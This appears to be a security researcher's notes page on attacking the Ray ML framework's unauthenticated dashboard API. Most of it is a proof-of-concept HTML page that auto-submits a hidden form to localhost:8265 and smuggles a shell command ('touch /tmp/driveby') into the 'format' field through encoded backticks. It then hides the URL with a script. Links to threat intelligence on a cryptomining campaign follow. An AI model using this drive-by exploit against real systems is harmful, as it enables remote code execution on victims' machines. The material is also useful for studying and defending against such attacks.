---
aliases: 
tags:
  - MLops-attack
  - ART
last_tested: 08/2023
transferable:
---


## **PoC**
Ray is at its core a tool for arbitrary code execution! 
Command execution via API by anyone on the network
**Phishing URL to codex:** 

```
<html>
<body>
<form action="http://localhost:8265/worker/cpu_profile">
<input type="hidden" name="pid" value="66758" />
<input type="hidden" name="ip" value="192&#46;168&#46;1&#46;5" />
<input type="hidden" name="duration" value="5" />
<input type="hidden" name="native" value="0" />
<input type="hidden" name="format" value="&#96;&#59;&#96;touch&#32;&#47;tmp&#47;driveby&#96;" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>

```
Source: twitter.com/danhmcinerney 
https://hackstery.com/2023/10/13/no-one-is-prefect-is-your-mlops-infrastructure-leaking-secrets/ 
## **Details**

Ray is a seriously powerful tool, enabling the creation and modification of models and datasets. 
Gaining access to Ray for an enterprise could be devastating. 
**Threat intel:** [details of a campaign of targetting ML workloads, but for (sigh)
running cryptominers. ](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild) 


	
[Video](https://www.youtube.com/watch?v=e3ybnXjtpIc)
[Paper](https://arxiv.org/abs/2302.10149) 
### ATT&CK Matrix